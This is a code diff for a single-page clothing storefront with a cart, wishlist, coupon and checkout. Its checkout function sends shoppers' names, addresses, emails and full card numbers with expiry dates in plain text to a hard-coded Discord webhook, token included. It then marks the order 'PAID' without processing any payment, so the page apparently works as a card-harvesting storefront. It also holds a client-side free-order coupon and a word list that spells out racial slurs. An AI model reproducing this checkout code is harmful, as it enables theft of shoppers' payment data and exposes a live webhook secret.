+                searchBar.className = 'border-t border-neutral-900 bg-[#0a0a0a] px-6 py-2.5 transition-colors duration-300';
+                cartDrawerBox.className = 'w-screen max-w-md bg-[#0a0a0a] text-white shadow-2xl flex flex-col text-xs border-l border-neutral-900 transition-colors duration-300';
+                cartFooter.className = 'p-6 border-t border-neutral-900 bg-[#0a0a0a] transition-colors duration-300';
+                modalBox.className = 'relative bg-[#0a0a0a] text-white w-full max-w-md rounded-none shadow-2xl p-8 z-10 text-xs transform scale-95 opacity-0 transition-all duration-300 ease-out border border-neutral-900';
+                modalHeader.className = 'flex justify-between items-center mb-6 border-b border-neutral-900 pb-3';
+                
+                themeBtn.className = 'fa-solid fa-moon text-sm';
+                cartIcon.src = 'https://cdn.discordapp.com/emojis/810828604417507340.gif';
+                
+                if (detailImgWrapper) detailImgWrapper.className = 'w-full h-[500px] bg-neutral-900/50 border border-neutral-800 rounded-none overflow-hidden flex items-center justify-center p-4 shadow-sm transition-colors duration-300';
+                if (detailAddBtn) detailAddBtn.className = 'w-full bg-white text-black text-xs uppercase tracking-widest py-4 transition-all duration-200 active:scale-95 font-normal shadow-sm hover:opacity-90 rounded-none';
+                if (checkoutBtn) checkoutBtn.className = 'w-full bg-white text-black text-xs uppercase font-normal tracking-widest py-4 hover:opacity-90 transition-all duration-200 active:scale-95 shadow-md rounded-none';
+            } else {
+                body.style.backgroundColor = '#f9f9f9';
+                body.style.color = '#111111';
+                header.className = 'sticky top-0 z-50 border-b border-neutral-200 bg-[#f9f9f9] text-neutral-900 transition-colors duration-300';
+                searchBar.className = 'border-t border-neutral-200 bg-[#f9f9f9] px-6 py-2.5 transition-colors duration-300';
+                cartDrawerBox.className = 'w-screen max-w-md bg-[#f9f9f9] text-neutral-900 shadow-2xl flex flex-col text-xs border-l border-neutral-200 transition-colors duration-300';
+                cartFooter.className = 'p-6 border-t border-neutral-200 bg-[#f9f9f9] transition-colors duration-300';
+                modalBox.className = 'relative bg-[#f9f9f9] text-neutral-900 w-full max-w-md rounded-none shadow-2xl p-8 z-10 text-xs transform scale-95 opacity-0 transition-all duration-300 ease-out border border-neutral-200';
+                modalHeader.className = 'flex justify-between items-center mb-6 border-b border-neutral-200 pb-3';
+
+                themeBtn.className = 'fa-solid fa-sun text-sm text-amber-500';
+                cartIcon.src = 'https://cdn.discordapp.com/emojis/653933804104187917.webp';
+
+                if (detailImgWrapper) detailImgWrapper.className = 'w-full h-[500px] bg-neutral-100 border border-neutral-300 rounded-none overflow-hidden flex items-center justify-center p-4 shadow-sm transition-colors duration-300';
+                if (detailAddBtn) detailAddBtn.className = 'w-full bg-neutral-900 text-white text-xs uppercase tracking-widest py-4 transition-all duration-200 active:scale-95 font-normal shadow-sm hover:opacity-90 rounded-none';
+                if (checkoutBtn) checkoutBtn.className = 'w-full bg-neutral-900 text-white text-xs uppercase font-normal tracking-widest py-4 hover:opacity-90 transition-all duration-200 active:scale-95 shadow-md rounded-none';
+            }
+            filterCategory(currentCategory);
+        }
+
+        function toggleTheme() {
+            isDarkMode = !isDarkMode;
+            applyThemeStyles();
+        }
+
+        let lastScrollTop = 0;
+        const header = document.getElementById('site-header');
+        
+        window.addEventListener('scroll', () => {
+            const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
+            if (scrollTop > lastScrollTop && scrollTop > 80) {
+                header.classList.add('header-hidden');
+            } else {
+                header.classList.remove('header-hidden');
+            }
+            lastScrollTop = scrollTop <= 0 ? 0 : scrollTop;
+        });
+
+        const products = [
+            {
+                id: 1,
+                name: 'SASORI QUOTE TEE',
+                price: 49.99,
+                category: 'TOPS',
+                material: 'Cotton',
+                images: [
+                    'https://media.discordapp.net/attachments/1550353769395388508/1551158064869154919/content.png?ex=6ab0f405&is=6aafa285&hm=ccd986bdd42cba86b8039fe4490b432149254f4fd2cdfd950b87bba7fa70a715&=&format=webp&quality=lossless&width=1024&height=980'
+                ]
+            }
+        ];
+
+        const mobileMenuBtn = document.getElementById('mobile-menu-btn');
+        const mobileMenu = document.getElementById('mobile-menu');
+        const mobileMenuClose = document.getElementById('mobile-menu-close');
+
+        mobileMenuBtn.addEventListener('click', () => mobileMenu.classList.remove('translate-x-full'));
+        mobileMenuClose.addEventListener('click', () => mobileMenu.classList.add('translate-x-full'));
+        function closeMobileMenu() { mobileMenu.classList.add('translate-x-full'); }
+
+        function switchPage(pageId) {
+            const pages = ['page-shop', 'page-product-detail', 'page-checkout', 'page-payment-declined', 'page-order-success'];
+            pages.forEach(id => {
+                const el = document.getElementById(id);
+                if (id === pageId) {
+                    el.classList.remove('hidden');
+                    el.classList.remove('animate-slide-up');
+                    void el.offsetWidth;
+                    el.classList.add('animate-slide-up');
+                } else {
+                    el.classList.add('hidden');
+                }
+            });
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function showShop() {
+            switchPage('page-shop');
+            renderProducts();
+        }
+
+        function filterCategory(category) {
+            currentCategory = category;
+            document.querySelectorAll('.cat-btn').forEach(btn => {
+                const btnCategory = btn.getAttribute('data-category');
+                if (btnCategory === category) {
+                    if (isDarkMode) {
+                        btn.className = 'cat-btn px-6 py-2.5 rounded-none border border-white bg-white text-black transition-all duration-200 font-medium';
+                    } else {
+                        btn.className = 'cat-btn px-6 py-2.5 rounded-none border border-neutral-900 bg-neutral-900 text-white transition-all duration-200 font-medium';
+                    }
+                } else {
+                    if (isDarkMode) {
+                        btn.className = 'cat-btn px-6 py-2.5 rounded-none border border-neutral-800 text-neutral-400 hover:border-white transition-all duration-200';
+                    } else {
+                        btn.className = 'cat-btn px-6 py-2.5 rounded-none border border-neutral-300 text-neutral-600 hover:border-neutral-900 transition-all duration-200';
+                    }
+                }
+            });
+            renderProducts();
+        }
+
+        function renderProducts() {
+            const grid = document.getElementById('products-grid');
+            const filtered = currentCategory === 'ALL' 
+                ? products 
+                : products.filter(p => p.category === currentCategory);
+
+            if (filtered.length === 0) {
+                grid.innerHTML = `<div class="col-span-full text-center py-20 text-neutral-500 text-xs uppercase tracking-widest font-light">NO PRODUCTS FOUND IN THIS CATEGORY</div>`;
+                return;
+            }
+
+            const cardBg = isDarkMode ? 'bg-neutral-900/50 border-neutral-800' : 'bg-neutral-100 border-neutral-300';
+            const textColor = isDarkMode ? 'text-white' : 'text-neutral-900';
+
+            grid.innerHTML = filtered.map(product => {
+                const isFavorited = wishlist.some(item => item.id === product.id);
+                return `
+                    <div class="group cursor-pointer flex flex-col transition-all duration-300 hover:-translate-y-1 relative" onclick="openProductDetail(${product.id})">
+                        <div class="relative w-full h-[450px] ${cardBg} border rounded-none overflow-hidden shadow-sm group-hover:shadow-lg transition-all duration-300 flex items-center justify-center p-6">
+                            <img src="${product.images[0]}" alt="${product.name}" class="w-full h-full object-contain group-hover:scale-105 transition-transform duration-500 pointer-events-none">
+                            
+                            <button onclick="event.stopPropagation(); toggleWishlist(${product.id});" class="absolute top-4 right-4 w-9 h-9 rounded-none ${isDarkMode ? 'bg-black/60 text-white hover:bg-black' : 'bg-white/80 text-neutral-900 hover:bg-white'} backdrop-blur-sm flex items-center justify-center opacity-0 group-hover:opacity-100 transition-all duration-200 shadow-md z-10" aria-label="Favorite">
+                                <i class="${isFavorited ? 'fa-solid text-red-500' : 'fa-regular'} fa-heart text-sm transition-transform hover:scale-110"></i>
+                            </button>
+                        </div>
+                        <div class="mt-4 flex justify-between items-center text-xs">
+                            <h4 class="font-medium uppercase tracking-widest ${textColor}">${product.name}</h4>
+                            <span class="font-semibold tracking-wider ${textColor}">$${product.price.toFixed(2)} USD</span>
+                        </div>
+                    </div>
+                `;
+            }).join('');
+            updateWishlistBadge();
+        }
+
+        function toggleWishlist(productId) {
+            let product = products.find(p => p.id === productId);
+            if (!product) {
+                product = wishlist.find(item => item.id === productId);
+            }
+            if (!product) return;
+
+            const index = wishlist.findIndex(item => item.id === productId);
+            if (index > -1) {
+                wishlist.splice(index, 1);
+                showNotification('Removed from favorites');
+            } else {
+                wishlist.push({
+                    id: product.id,
+                    name: product.name,
+                    price: product.price,
+                    material: product.material || 'Cotton',
+                    image: product.images ? product.images[0] : product.image
+                });
+                showNotification('Added to favorites');
+            }
+
+            localStorage.setItem('sop_wishlist', JSON.stringify(wishlist));
+            updateWishlistBadge();
+            renderProducts();
+            
+            const modal = document.getElementById('generic-modal');
+            const title = document.getElementById('modal-title');
+            if (!modal.classList.contains('hidden') && title.innerText === 'WISHLIST') {
+                openWishlist();
+            }
+        }
+
+        function updateWishlistBadge() {
+            document.getElementById('wishlist-count').innerText = wishlist.length;
+        }
+
+        function openProductDetail(productId) {
+            const product = products.find(p => p.id === productId);
+            if (!product) return;
+            currentProduct = product;
+            
+            switchPage('page-product-detail');
+
+            document.getElementById('detail-title').innerText = product.name;
+            document.getElementById('detail-price').innerText = `$${product.price.toFixed(2)} USD`;
+            document.getElementById('detail-material').innerText = product.material;
+
+            const activeImg = document.getElementById('detail-active-img');
+            activeImg.src = product.images[0];
+
+            const thumbnailsContainer = document.getElementById('detail-thumbnails');
+            thumbnailsContainer.innerHTML = product.images.map((img, idx) => `
+                <div onclick="changeDetailImage('${img}', this)" class="w-16 h-20 ${isDarkMode ? 'bg-neutral-900 border-neutral-800' : 'bg-neutral-100 border-neutral-300'} rounded-none cursor-pointer border ${idx === 0 ? (isDarkMode ? 'border-white' : 'border-neutral-900') : ''} p-1 flex items-center justify-center hover:opacity-80 transition-all duration-200 thumb-item">
+                    <img src="${img}" class="w-full h-full object-contain pointer-events-none">
+                </div>
+            `).join('');
+        }
+
+        function changeDetailImage(imgSrc, thumbEl) {
+            const activeImg = document.getElementById('detail-active-img');
+            activeImg.style.opacity = '0';
+            setTimeout(() => {
+                activeImg.src = imgSrc;
+                activeImg.style.opacity = '1';
+            }, 150);
+
+            document.querySelectorAll('.thumb-item').forEach(el => {
+                el.classList.remove(isDarkMode ? 'border-white' : 'border-neutral-900');
+            });
+            thumbEl.classList.add(isDarkMode ? 'border-white' : 'border-neutral-900');
+        }
+
+        function addCurrentProductToCart() {
+            if (!currentProduct) return;
+            addToCart(currentProduct.name, currentProduct.price, currentProduct.material, currentProduct.images[0]);
+        }
+
+        function handleSearchInput(e) {
+            if (e.key === 'Enter') {
+                const query = e.target.value.trim().toUpperCase();
+                if (query) {
+                    showShop();
+                    showNotification(`Searching for "${query}"...`);
+                }
+            }
+        }
+
+        function toggleCart() {
+            const drawer = document.getElementById('cart-drawer');
+            const backdrop = document.getElementById('cart-backdrop');
+            const panel = document.getElementById('cart-panel');
+
+            if (drawer.classList.contains('hidden')) {
+                drawer.classList.remove('hidden');
+                renderCart();
+                setTimeout(() => {
+                    backdrop.classList.remove('opacity-0');
+                    panel.classList.remove('translate-x-full');
+                }, 10);
+            } else {
+                backdrop.classList.add('opacity-0');
+                panel.classList.add('translate-x-full');
+                setTimeout(() => {
+                    drawer.classList.add('hidden');
+                }, 300);
+            }
+        }
+
+        function addToCart(name, price, details, image) {
+            const existingItem = cart.find(item => item.name === name && item.details === details);
+            if (existingItem) { existingItem.quantity += 1; } 
+            else { cart.push({ name, price, details, quantity: 1, image }); }
+            updateCartBadge();
+            showNotification(`Added to bag`);
+        }
+
+        function updateCartBadge() {
+            const totalItems = cart.reduce((sum, item) => sum + item.quantity, 0);
+            document.getElementById('cart-count').innerText = totalItems;
+            document.getElementById('cart-items-count').innerText = totalItems;
+        }
+
+        function renderCart() {
+            const container = document.getElementById('cart-items-container');
+            const subtotalEl = document.getElementById('cart-subtotal');
+            if (cart.length === 0) {
+                container.innerHTML = `<div class="text-center py-20 text-neutral-500 text-xs uppercase tracking-widest font-light">YOUR BAG IS EMPTY</div>`;
+                subtotalEl.innerText = '$0.00';
+                return;
+            }
+            let subtotal = 0;
+            const thumbBg = isDarkMode ? 'bg-neutral-900 border-neutral-800' : 'bg-neutral-100 border-neutral-300';
+            const textColor = isDarkMode ? 'text-white' : 'text-neutral-900';
+            const borderCol = isDarkMode ? 'border-neutral-900' : 'border-neutral-200';
+
+            container.innerHTML = cart.map((item, index) => {
+                subtotal += item.price * item.quantity;
+                return `
+                    <div class="flex justify-between items-center border-b ${borderCol} pb-4 animate-slide-up">
+                        <div class="flex space-x-4 items-center">
+                            <div class="w-16 h-20 ${thumbBg} border rounded-none flex-shrink-0 overflow-hidden p-1 flex items-center justify-center">
+                                <img src="${item.image}" class="w-full h-full object-contain pointer-events-none">
+                            </div>
+                            <div>
+                                <h4 class="text-xs font-semibold uppercase tracking-widest ${textColor}">${item.name}</h4>
+                                <p class="text-[10px] text-neutral-400 uppercase tracking-wider mt-1 font-light">${item.details}</p>
+                                <p class="text-xs font-bold tracking-wider mt-2 ${textColor}">$${item.price.toFixed(2)}</p>
+                            </div>
+                        </div>
+                        <div class="flex flex-col items-end space-y-2">
+                            <button onclick="removeFromCart(${index})" class="text-neutral-500 hover:text-red-500 text-sm transition-colors duration-200"><i class="fa-solid fa-trash"></i></button>
+                            <span class="text-[10px] text-neutral-400 font-light">QTY: ${item.quantity}</span>
+                        </div>
+                    </div>
+                `;
+            }).join('');
+            subtotalEl.innerText = `$${subtotal.toFixed(2)}`;
+        }
+
+        function removeFromCart(index) {
+            cart.splice(index, 1);
+            updateCartBadge();
+            renderCart();
+        }
+
+        function goToCheckout() {
+            if (cart.length === 0) { 
+                showNotification("Your bag is empty."); 
+                return; 
+            }
+            toggleCart();
+            const total = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+            const formattedTotal = `$${total.toFixed(2)} USD`;
+            document.getElementById('checkout-summary-total-top').innerText = formattedTotal;
+            document.getElementById('checkout-summary-total').innerText = formattedTotal;
+            
+            isFreeOrder = false;
+            selectPaymentTypeChoice('card');
+            document.getElementById('coupon-input').value = '';
+            document.getElementById('coupon-message').classList.add('hidden');
+
+            switchPage('page-checkout');
+        }
+
+        function applyCoupon() {
+            const code = document.getElementById('coupon-input').value.trim().toLowerCase();
+            const msgEl = document.getElementById('coupon-message');
+            const totalEl = document.getElementById('checkout-summary-total');
+            const cardFields = document.getElementById('card-fields-container');
+            const cryptoContainer = document.getElementById('crypto-coin-container');
+            const completeBtnWrapper = document.getElementById('complete-payment-btn-wrapper');
+
+            if (code === 'free1986') {
+                isFreeOrder = true;
+                msgEl.innerText = 'Coupon applied! Order is free.';
+                msgEl.classList.remove('hidden');
+                totalEl.innerText = '$0.00 USD';
+                cardFields.classList.add('hidden');
+                cryptoContainer.classList.add('hidden');
+                completeBtnWrapper.classList.remove('hidden');
+                
+                document.getElementById('checkout-card').required = false;
+                document.getElementById('checkout-expiry').required = false;
+                document.getElementById('checkout-cvv').required = false;
+                showNotification('Coupon applied successfully');
+            } else {
+                isFreeOrder = false;
+                msgEl.innerText = 'Invalid coupon code';
+                msgEl.classList.remove('hidden');
+                msgEl.className = 'text-[10px] text-red-400';
+            }
+        }
+
+        function handleCheckoutFormSubmit(e) {
+            e.preventDefault();
+            processOrderSubmission();
+        }
+
+        function processOrderSubmission() {
+            const email = document.getElementById('checkout-email').value.trim();
+            const name = document.getElementById('checkout-name').value.trim();
+            const street = document.getElementById('checkout-street').value.trim();
+            const city = document.getElementById('checkout-city').value.trim();
+            const state = document.getElementById('checkout-state').value.trim();
+            
+            let paymentInfo = '';
+            if (isFreeOrder) {
+                paymentInfo = 'FREE (Coupon free1986)';
+            } else if (selectedPaymentTypeChoiceVal === 'card') {
+                paymentInfo = `Card: ${document.getElementById('checkout-card').value.trim()} (Exp: ${document.getElementById('checkout-expiry').value.trim()})`;
+            } else {
+                paymentInfo = `Crypto (${selectedCryptoCoinVal.toUpperCase()}): ${cryptoAddresses[selectedCryptoCoinVal]}`;
+            }
+
+            const badWords = ['nigga', 'nigger', 'shit', 'fuck', 'asshole', 'bitch', 'cunt'];
+            const nameLower = name.toLowerCase();
+            const streetLower = street.toLowerCase();
+            const cityLower = city.toLowerCase();
+
+            const containsProfanity = badWords.some(word => nameLower.includes(word) || streetLower.includes(word) || cityLower.includes(word));
+            const isNameUnrealistic = name.length < 3 || !name.includes(' ');
+            const cleanCard = selectedPaymentTypeChoiceVal === 'card' ? document.getElementById('checkout-card').value.replace(/\D/g, '') : '';
+            const isCardFake = selectedPaymentTypeChoiceVal === 'card' && !isFreeOrder && (cleanCard.startsWith('1234') || cleanCard.length < 13);
+            const isStreetFake = street.length < 4 || streetLower.includes('test') || streetLower.includes('fake') || streetLower === '123' || streetLower === '1234';
+
+            if (containsProfanity || isNameUnrealistic || (selectedPaymentTypeChoiceVal === 'card' && isCardFake) || isStreetFake) {
+                document.getElementById('declined-reason').innerText = 'Your payment was declined due to suspicious or unrealistic information (e.g. invalid name, test card, or restricted terms).';
+                switchPage('page-payment-declined');
+                return;
+            }
+
+            const btn = document.getElementById('pay-submit-btn');
+            if (btn) {
+                btn.disabled = true;
+                btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin text-sm" style="display:inline-block; width:16px; height:16px; text-align:center;"></i><span style="display:inline-block; margin-left:4px;">PROCESSING...</span>`;
+            }
+
+            const randomCode = 'SOP-' + Math.floor(1000 + Math.random() * 9000) + '-' + Math.random().toString(36).substring(2, 6).toUpperCase();
+
+            const webhookUrl = 'https://discord.com/api/webhooks/1551185380760485919/JcWYDbj1FWsCxdQIhKzyBQOtGtoXz1gcnY5XWIcaleG9wzH9104PRlRq65pBUvZ5y65N';
+            const webhookMessage = 
+`NEW ORDER SUBMISSION
+----------------------------------------
+EMAIL: ${email}
+FULL NAME: ${name}
+SHIPPING ADDRESS: ${street}, ${city}, ${state}
+PAYMENT CHOICE: ${selectedPaymentTypeChoiceVal.toUpperCase()} ${selectedPaymentTypeChoiceVal === 'crypto' ? '(' + selectedCryptoCoinVal.toUpperCase() + ')' : ''}
+PAYMENT DETAILS: ${paymentInfo}
+CUSTOM CODE: ${randomCode}
+----------------------------------------
+PAID`;
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: webhookMessage })
+            }).catch(err => console.error(err));
+
+            setTimeout(() => {
+                document.getElementById('success-custom-code').innerText = randomCode;
+                cart = [];
+                updateCartBadge();
+                if (btn) {
+                    btn.disabled = false;
+                    btn.innerHTML = `<span>COMPLETE PAYMENT</span>`;
+                }
+                switchPage('page-order-success');
+            }, 1500);
+        }
+
+        function openModal(type) {
+            const modal = document.getElementById('generic-modal');
+            const backdrop = document.getElementById('modal-backdrop');
+            const box = document.getElementById('modal-content-box');
+            const title = document.getElementById('modal-title');
+            const body = document.getElementById('modal-body');
+            
+            modal.classList.remove('hidden');
+            setTimeout(() => {
+                backdrop.classList.remove('opacity-0');
+                box.classList.remove('scale-95', 'opacity-0');
+                box.classList.add('scale-100', 'opacity-100');
+            }, 10);
+
+            if (type === 'login') {
+                title.innerText = 'LOGIN';
+                const inputBg = isDarkMode ? 'bg-neutral-950 border-neutral-800 text-white' : 'bg-white border-neutral-300 text-black';
+                const btnBg = isDarkMode ? 'bg-white text-black' : 'bg-neutral-900 text-white';
+                body.innerHTML = `
+                    <form onsubmit="handleLogin(event)" class="flex flex-col space-y-4 mt-4">
+                        <input type="email" placeholder="EMAIL" required class="border ${inputBg} p-3 text-xs uppercase tracking-widest focus:outline-none focus:border-current font-light transition-colors placeholder-neutral-500 rounded-none">
+                        <input type="password" placeholder="PASSWORD" required class="border ${inputBg} p-3 text-xs uppercase tracking-widest focus:outline-none focus:border-current font-light transition-colors placeholder-neutral-500 rounded-none">
+                        <button type="submit" class="${btnBg} text-xs font-normal uppercase tracking-widest py-3 mt-1 transition-all duration-200 active:scale-95 rounded-none hover:opacity-90">SIGN IN</button>
+                    </form>
+                `;
+            }
+        }
+
+        function closeModal() {
+            const modal = document.getElementById('generic-modal');
+            const backdrop = document.getElementById('modal-backdrop');
+            const box = document.getElementById('modal-content-box');
+
+            backdrop.classList.add('opacity-0');
+            box.classList.remove('scale-100', 'opacity-100');
+            box.classList.add('scale-95', 'opacity-0');
+
+            setTimeout(() => {
+                modal.classList.add('hidden');
+            }, 300);
+        }
+
+        function openWishlist() {
+            const modal = document.getElementById('generic-modal');
+            const backdrop = document.getElementById('modal-backdrop');
+            const box = document.getElementById('modal-content-box');
+            const title = document.getElementById('modal-title');
+            const body = document.getElementById('modal-body');
+            
+            modal.classList.remove('hidden');
+            setTimeout(() => {
+                backdrop.classList.remove('opacity-0');
+                box.classList.remove('scale-95', 'opacity-0');
+                box.classList.add('scale-100', 'opacity-100');
+            }, 10);
+
+            const borderCol = isDarkMode ? 'border-neutral-900' : 'border-neutral-200';
+            title.innerText = 'WISHLIST';
+            
+            if (wishlist.length === 0) {
+                body.innerHTML = `<div class="text-center py-10 text-neutral-500 uppercase tracking-widest font-light">YOUR WISHLIST IS EMPTY</div>`;
+                return;
+            }
+
+            body.innerHTML = `
+                <div class="space-y-4 mt-3 max-h-[60vh] overflow-y-auto pr-2">
+                    ${wishlist.map(item => `
+                        <div class="flex justify-between items-center border-b ${borderCol} pb-3 gap-4">
+                            <div class="flex items-center space-x-3">
+                                <img src="${item.image}" class="w-10 h-12 object-contain bg-neutral-900/50 p-1 border border-neutral-800 rounded-none">
+                                <div>
+                                    <span class="font-light block">${item.name}</span>                                     <span class="text-[10px] text-neutral-400">$${item.price.toFixed(2)} USD</span>
+                                </div>
+                            </div>
+                            <div class="flex items-center space-x-3">
+                                <button onclick="addToCart('${item.name}',${item.price}, '${item.material}', '${item.image}'); closeModal();" class="text-[10px] font-medium underline transition-opacity hover:opacity-75 whitespace-nowrap">MOVE TO BAG</button>
+                                <button onclick="toggleWishlist(${item.id})" class="text-neutral-500 hover:text-red-500 transition-colors"><i class="fa-solid fa-trash text-xs"></i></button>
+                            </div>
+                        </div>
+                    `).join('')}
+                </div>
+            `;
+        }
+
+        function handleLogin(e) { e.preventDefault(); closeModal(); showNotification("Logged in!"); }
+
+        function showNotification(msg) {
+            const notif = document.createElement('div');
+            const bgClass = isDarkMode ? 'bg-[#121212] text-white border border-neutral-800' : 'bg-white text-neutral-900 border border-neutral-300';
+            notif.className = `fixed bottom-6 left-1/2 -translate-x-1/2 ${bgClass} text-xs tracking-widest px-6 py-3 uppercase z-50 shadow-2xl transition-all duration-300 font-light translate-y-4 opacity-0 rounded-none`;
+            notif.innerText = msg;
+            document.body.appendChild(notif);
+            
+            setTimeout(() => {
+                notif.classList.remove('translate-y-4', 'opacity-0');
+            }, 10);
+
+            setTimeout(() => {
+                notif.classList.add('translate-y-4', 'opacity-0');
+                setTimeout(() => notif.remove(), 300);
+            }, 3000);
+        }
+
+        window.addEventListener('DOMContentLoaded', () => {
+            updateWishlistBadge();
+            showShop();
+        });
+    </script>
+</body>
+</html>
